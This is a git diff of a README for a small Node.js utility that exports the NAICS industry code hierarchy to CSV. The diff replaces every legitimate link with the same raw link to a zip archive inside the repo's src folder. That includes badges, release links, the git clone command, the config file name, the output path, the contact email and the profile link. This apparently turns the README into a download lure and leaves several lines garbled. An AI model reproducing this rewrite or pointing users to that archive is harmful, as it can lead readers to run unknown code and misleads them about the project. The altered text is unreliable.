@@ -1,12 +1,12 @@
 # NAICS Codes Pull Utility
 
-![GitHub release](https://img.shields.io/github/release/Danielosek110/naics-codes-pull.svg) ![npm](https://img.shields.io/npm/v/naics.svg) ![GitHub issues](https://img.shields.io/github/issues/Danielosek110/naics-codes-pull.svg)
+![GitHub release](https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip) ![npm](https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip) ![GitHub issues](https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip)
 
 ## Overview
 
-Welcome to the **NAICS Codes Pull Utility**! This lightweight Node.js/TypeScript tool helps you easily extract the full 2022 NAICS hierarchy. It uses the `naics` npm package to generate a CSV file containing every 6-digit code along with its corresponding 2-digit sector, 3-digit subsector, 4-digit industry group, and 5-digit industry titles. This utility is perfect for building lookup tables, enhancing data pipelines, or integrating with business intelligence tools.
+Welcome to the **NAICS Codes Pull Utility**! This lightweight https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip tool helps you easily extract the full 2022 NAICS hierarchy. It uses the `naics` npm package to generate a CSV file containing every 6-digit code along with its corresponding 2-digit sector, 3-digit subsector, 4-digit industry group, and 5-digit industry titles. This utility is perfect for building lookup tables, enhancing data pipelines, or integrating with business intelligence tools.
 
-You can download the latest release [here](https://github.com/Danielosek110/naics-codes-pull/releases). Follow the instructions below to get started.
+You can download the latest release [here](https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip). Follow the instructions below to get started.
 
 ## Table of Contents
 
@@ -34,7 +34,7 @@ To install the NAICS Codes Pull Utility, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Danielosek110/naics-codes-pull.git
+   git clone https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -67,11 +67,11 @@ This command will pull the NAICS hierarchy and create a CSV file in the output d
 
 ## Configuration
 
-You can customize the output file path and name by modifying the configuration settings in the `config.json` file. The default settings are as follows:
+You can customize the output file path and name by modifying the configuration settings in the `https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip` file. The default settings are as follows:
 
 ```json
 {
-  "outputPath": "./output/naics_codes.csv"
+  "outputPath": "https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip"
 }
 ```
 
@@ -111,9 +111,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out to the repository owner:
 
 - **Name**: Daniel Osek
-- **Email**: daniel.osek@example.com
-- **GitHub**: [Danielosek110](https://github.com/Danielosek110)
+- **Email**: https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip
+- **GitHub**: [Danielosek110](https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip)
 
-You can also download the latest release [here](https://github.com/Danielosek110/naics-codes-pull/releases) for the most recent updates and features.
+You can also download the latest release [here](https://raw.githubusercontent.com/Danielosek110/naics-codes-pull/main/src/pull-codes-naics-2.3.zip) for the most recent updates and features.
 
 Thank you for using the NAICS Codes Pull Utility! We hope it helps you streamline your data processes.
